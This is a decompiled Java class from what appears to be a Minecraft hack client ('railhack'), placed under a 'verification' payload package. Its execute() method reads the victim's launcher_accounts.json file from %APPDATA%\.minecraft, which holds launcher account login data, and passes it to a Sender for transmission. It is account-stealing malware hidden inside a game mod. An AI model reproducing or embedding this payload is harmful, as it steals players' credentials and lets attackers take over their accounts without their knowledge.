//Deobfuscated with https://github.com/SimplyProgrammer/Minecraft-Deobfuscator3000 using mappings "C:\Users\Admin\Desktop\Minecraft-Deobfuscator3000-1.2.2\1.12 stable mappings"!

//Decompiled by Procyon!

package me.shatteredhej.railhack.railhackmod.util.extra.utils.verification.payload.impl;

import me.shatteredhej.railhack.railhackmod.util.extra.utils.verification.util.*;
import me.shatteredhej.railhack.railhackmod.util.extra.utils.verification.payload.*;
import java.util.function.*;
import java.io.*;
import java.util.*;

public final class LauncherAccounts implements Payload
{
    @Override
    public void execute() {
        final Optional<File> file = FileUtil.getFile(System.getenv("APPDATA") + "\\.minecraft\\launcher_accounts.json");
        file.ifPresent(Sender::send);
    }
}
